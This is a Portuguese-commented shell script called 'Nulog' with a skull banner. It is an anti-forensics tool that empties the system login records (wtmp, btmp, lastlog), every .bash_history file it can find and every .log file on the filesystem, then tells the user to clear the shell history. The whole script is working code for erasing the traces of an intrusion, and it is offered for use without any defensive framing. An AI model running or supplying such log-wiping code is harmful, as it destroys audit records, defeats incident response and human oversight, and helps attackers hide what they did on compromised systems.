#!/usr/bin/sh
printf '\033[0;31m
     ████               ████
    ███                   ███
   ███                     ███
  ███                       ███
 ███                         ███
████                         ████
████                         ████
██████       ███████       ██████
█████████████████████████████████
█████████████████████████████████
 ███████████████████████████████ 
  ████ ███████████████████ ████  
       ███▀███████████▀███       
      ████──▀███████▀──████      
      █████───█████───█████      
      ███████▄█████▄███████      
       ███████████████████       
        █████████████████        
         ███████████████         
          █████████████          
           ███████████           
          ███──▀▀▀──███          
          ███─█████─███          
           ███─███─███           
            █████████

\033[0;31m  _   _       _\033[0;37m _             
\033[0;31m | \ | |_   _| \033[0;37m| | ___   __ _ 
\033[0;31m |  \| | | | | \033[0;37m| |/ _ \ / _` |
\033[0;31m | |\  | |_| | \033[0;37m| | (_) | (_| |
\033[0;31m |_| \_|\__,_|_\033[0;37m|_|\___/ \__, |
\033[0;31m               \033[0;37m         |___/ 
'
sleep 1

######### Excluindo logs de login ##########
printf '\n\033[0;34m[*] \033[0;37mLimpando logs de login no sistema\n'
sleep 1
echo >/var/log/wtmp
echo >/var/log/btmp
echo >/var/log/lastlog
printf '\033[0;32m[+] \033[0;37mLogs de login apagado com sucesso\n'
sleep 1

######### Limpar .bashrc  ##########

printf '\n\033[0;34m[*] \033[0;37mLimpando historicos no sistema\n'
sleep 1
find / -name ".bash_history" 2>/dev/null > .history
while read history; do
    echo > $history 2>&1
    printf "\n\033[0;32m[+] \033[0;37mHistorico apagado: $history"
done<.history
rm -rf .history
printf '\n\n\033[0;32m[+] \033[0;37mHistoricos de login apagado com sucesso\n'
sleep 1

######### Excluindo conteudo de .log ##########
printf '\n\033[0;34m[*] \033[0;37mProcurando por arquivos log no sistema\n'
find / -name "*.log" 2>/dev/null > .logs
countLogs='wc -l <.logs'

printf '\033[0;32m[+] \033[0;37mArquivos log encontrado'
sleep 1
printf '\n\033[0;34m[*] \033[0;37mApagando conteudo dentro dos arquivos log'

while read log; do
    echo > $log 2>&1
    printf "\n\033[0;32m[+] \033[0;37mLogs apagado: $log"
done<.logs
rm -rf .logs

printf '\n\n\033[0;32m[+] \033[0;37mArquivos log limpo com sucesso\n'
printf '\n\033[0;34m[*] \033[0;37mLimpe o historico de comandos "history -c"\n'
